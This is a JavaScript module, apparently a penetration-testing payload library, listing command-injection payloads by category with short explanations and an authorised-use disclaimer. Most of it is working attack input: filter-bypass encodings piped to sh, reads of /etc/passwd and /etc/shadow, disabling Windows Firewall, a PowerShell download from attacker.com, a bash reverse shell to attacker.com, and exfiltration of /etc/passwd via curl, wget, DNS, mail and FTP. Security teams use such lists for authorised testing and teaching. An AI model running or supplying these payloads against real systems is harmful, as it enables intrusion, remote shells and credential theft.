// Command Injection Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const COMMAND_INJECTION_CATEGORIES = {
  BASIC: 'Basic Injection',
  BLIND: 'Blind Injection',
  FILTER_BYPASS: 'Filter Bypass',
  WINDOWS: 'Windows-Specific',
  LINUX: 'Linux-Specific',
  DATA_EXFILTRATION: 'Data Exfiltration',
  OOB: 'Out-of-Band',
};

export const payloads = {
  BASIC: [
    {
      name: 'Semicolon separator',
      description: 'Execute additional command after semicolon',
      payload: `; id`,
      explanation: 'Semicolon terminates the original command and starts a new one.',
    },
    {
      name: 'Pipe to new command',
      description: 'Pipe output to another command',
      payload: `| id`,
      explanation: 'Pipes stdout of the first command to the second command.',
    },
    {
      name: 'Double pipe (OR)',
      description: 'Execute if first command fails',
      payload: `|| id`,
      explanation: 'Executes the right-side command only if the left-side command fails.',
    },
    {
      name: 'Ampersand (background)',
      description: 'Run command in background',
      payload: `& id`,
      explanation: 'Runs both commands; the second executes regardless of first result.',
    },
    {
      name: 'Double ampersand (AND)',
      description: 'Execute if first command succeeds',
      payload: `&& id`,
      explanation: 'Executes the right-side command only if the left-side succeeds.',
    },
    {
      name: 'Backtick substitution',
      description: 'Command substitution using backticks',
      payload: '`id`',
      explanation: 'Backtick syntax causes the shell to execute the enclosed command.',
    },
    {
      name: 'Dollar-paren substitution',
      description: 'POSIX command substitution',
      payload: `$(id)`,
      explanation: 'Modern POSIX-compliant command substitution syntax.',
    },
    {
      name: 'Newline separator',
      description: 'Inject via URL-encoded newline',
      payload: `%0a id`,
      explanation: 'URL-encoded newline (%0a) acts as command separator in shell.',
    },
  ],

  BLIND: [
    {
      name: 'Time-based ping (Unix)',
      description: 'Detect blind injection via delay',
      payload: `; ping -c 5 127.0.0.1`,
      explanation: 'Causes a ~5 second delay confirming blind command injection.',
    },
    {
      name: 'Sleep delay',
      description: 'Pause execution to confirm injection',
      payload: `; sleep 5`,
      explanation: 'sleep command causes measurable response delay.',
    },
    {
      name: 'Time-based ping (Windows)',
      description: 'Windows equivalent of timed delay',
      payload: `& ping -n 5 127.0.0.1`,
      explanation: 'Windows ping with count causes ~5 second delay.',
    },
    {
      name: 'Timeout (Windows)',
      description: 'Windows timeout command for delay',
      payload: `& timeout /T 5`,
      explanation: 'Windows timeout command for delay-based detection.',
    },
    {
      name: 'Write to temp file',
      description: 'Confirm injection via file write',
      payload: `; echo pwned > /tmp/pwned.txt`,
      explanation: 'Writing to /tmp confirms command execution on Linux.',
    },
  ],

  FILTER_BYPASS: [
    {
      name: 'String concatenation (Bash)',
      description: 'Bypass blacklists with variable concatenation',
      payload: `; ca$()t /etc/passwd`,
      explanation: 'Empty $() expands to nothing, splitting "cat" to bypass keyword filters.',
    },
    {
      name: 'Quotes bypass',
      description: 'Insert quotes to bypass filters',
      payload: `; c'a't /etc/passwd`,
      explanation: 'Quoted strings in Bash still execute as the command without the quotes.',
    },
    {
      name: 'Backslash bypass',
      description: 'Escape characters to bypass filters',
      payload: `; c\\at /etc/passwd`,
      explanation: 'Backslash escapes the next character but the command still runs.',
    },
    {
      name: 'Base64 encoded payload',
      description: 'Encode command to avoid detection',
      payload: `; echo aWQ= | base64 -d | sh`,
      explanation: 'Decodes and executes base64-encoded "id" to bypass string filters.',
    },
    {
      name: 'Wildcard bypass',
      description: 'Use glob patterns to reference binaries',
      payload: `; /???/??t /etc/passwd`,
      explanation: 'Glob wildcards (?) match any character, enabling obfuscated paths like /bin/cat.',
    },
    {
      name: 'IFS separator bypass',
      description: 'Use IFS variable as command separator',
      payload: '; cat${IFS}/etc/passwd',
      explanation: 'IFS (Internal Field Separator) variable defaults to whitespace and can replace spaces.',
    },
    {
      name: 'Hex encoding',
      description: 'Use hex-encoded command via printf',
      payload: `; printf '\\x69\\x64' | sh`,
      explanation: 'Hex-encoded "id" (\\x69\\x64) piped to shell for execution.',
    },
  ],

  WINDOWS: [
    {
      name: 'Whoami',
      description: 'Get current user on Windows',
      payload: `& whoami`,
      explanation: 'Reveals the user running the web server process on Windows.',
    },
    {
      name: 'System info',
      description: 'Dump system information',
      payload: `& systeminfo`,
      explanation: 'Retrieves detailed OS and hardware information.',
    },
    {
      name: 'List users',
      description: 'Enumerate local user accounts',
      payload: `& net user`,
      explanation: 'Lists all local users on the Windows machine.',
    },
    {
      name: 'Directory listing',
      description: 'List contents of a directory',
      payload: `& dir C:\\`,
      explanation: 'Lists files and folders in the root of the C: drive.',
    },
    {
      name: 'Environment variables',
      description: 'Dump environment variables',
      payload: `& set`,
      explanation: 'Shows all environment variables including sensitive config values.',
    },
    {
      name: 'PowerShell download',
      description: 'Download file using PowerShell',
      payload: `& powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\Windows\\Temp\\p.exe"`,
      explanation: 'Uses PowerShell to download a file from a remote server.',
    },
    {
      name: 'Disable firewall',
      description: 'Disable Windows Firewall',
      payload: `& netsh advfirewall set allprofiles state off`,
      explanation: 'Disables Windows Defender Firewall (requires admin privileges).',
    },
  ],

  LINUX: [
    {
      name: 'Current user (id)',
      description: 'Get current user and group info',
      payload: `; id`,
      explanation: 'Reveals user ID, group ID and supplementary groups.',
    },
    {
      name: 'Read /etc/passwd',
      description: 'Dump user account information',
      payload: `; cat /etc/passwd`,
      explanation: 'Reads the password file listing all system accounts.',
    },
    {
      name: 'Read /etc/shadow (root)',
      description: 'Read hashed passwords (requires root)',
      payload: `; cat /etc/shadow`,
      explanation: 'Shadow file contains password hashes — only readable by root.',
    },
    {
      name: 'Network interfaces',
      description: 'Display network interfaces',
      payload: `; ifconfig -a`,
      explanation: 'Lists all network interfaces and their IP addresses.',
    },
    {
      name: 'List cron jobs',
      description: 'Show scheduled cron tasks',
      payload: `; crontab -l`,
      explanation: 'Shows scheduled tasks which may reveal credentials or scripts.',
    },
    {
      name: 'Find SUID binaries',
      description: 'Find setuid binaries for privilege escalation',
      payload: `; find / -perm -u=s -type f 2>/dev/null`,
      explanation: 'SUID binaries can often be leveraged for privilege escalation.',
    },
    {
      name: 'Reverse shell (bash)',
      description: 'Establish a reverse shell connection',
      payload: `; bash -i >& /dev/tcp/attacker.com/4444 0>&1`,
      explanation: 'Opens a reverse shell back to attacker.com on port 4444.',
    },
  ],

  DATA_EXFILTRATION: [
    {
      name: 'HTTP exfiltration via curl',
      description: 'Send file contents to attacker server',
      payload: `; curl http://attacker.com/?data=$(cat /etc/passwd | base64)`,
      explanation: 'Encodes and sends /etc/passwd to a remote server via HTTP GET.',
    },
    {
      name: 'DNS exfiltration',
      description: 'Exfiltrate data via DNS queries',
      payload: `; ping $(cat /etc/hostname).attacker.com`,
      explanation: 'Embeds hostname in DNS query subdomain — visible in DNS logs.',
    },
    {
      name: 'SMTP email exfiltration',
      description: 'Send data via email using sendmail',
      payload: `; cat /etc/passwd | mail -s "exfil" attacker@evil.com`,
      explanation: 'Uses sendmail/mail binary to email sensitive data.',
    },
    {
      name: 'FTP exfiltration',
      description: 'Upload file via FTP',
      payload: `; ftp -n attacker.com << EOF\nuser anon anon\nput /etc/passwd\nEOF`,
      explanation: 'Uploads a file to an FTP server using anonymous login.',
    },
    {
      name: 'Wget POST exfiltration',
      description: 'POST data with wget',
      payload: `; wget --post-data="$(cat /etc/passwd)" http://attacker.com/receive`,
      explanation: 'Posts file contents as HTTP POST body to a remote server.',
    },
  ],

  OOB: [
    {
      name: 'DNS lookup OOB',
      description: 'Trigger DNS lookup for OOB detection',
      payload: `; nslookup attacker.com`,
      explanation: 'Performs DNS lookup — visible in DNS server logs for OOB confirmation.',
    },
    {
      name: 'Curl HTTP OOB',
      description: 'HTTP request for out-of-band confirmation',
      payload: `; curl http://attacker.com/oob`,
      explanation: 'Sends HTTP request to confirm blind RCE via server logs.',
    },
    {
      name: 'Burp Collaborator OOB',
      description: 'Use Burp Collaborator for OOB detection',
      payload: `; curl http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net`,
      explanation: 'Replace BURP-COLLABORATOR-SUBDOMAIN with a Burp Collaborator URL to detect blind injection.',
    },
    {
      name: 'Ping OOB',
      description: 'ICMP ping for out-of-band detection',
      payload: `; ping -c 1 attacker.com`,
      explanation: 'Sends ICMP echo to confirm code execution without direct output.',
    },
  ],
};

export function getAllCategories() {
  return Object.entries(COMMAND_INJECTION_CATEGORIES).map(([key, label]) => ({
    key,
    label,
  }));
}

export function getPayloadsByCategory(categoryKey) {
  return payloads[categoryKey] || [];
}

export const QUICK_TEST_PAYLOADS = [
  '; id',
  '| id',
  '&& id',
  '`id`',
  '$(id)',
  '; sleep 5',
  '& ping -n 5 127.0.0.1',
  '; echo vulnerable',
];

export const LEGAL_DISCLAIMER = `⚠️ LEGAL & ETHICAL DISCLAIMER: This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY. Only use with explicit written authorization from the system owner. Unauthorized command injection attacks are illegal and may result in criminal prosecution.`;
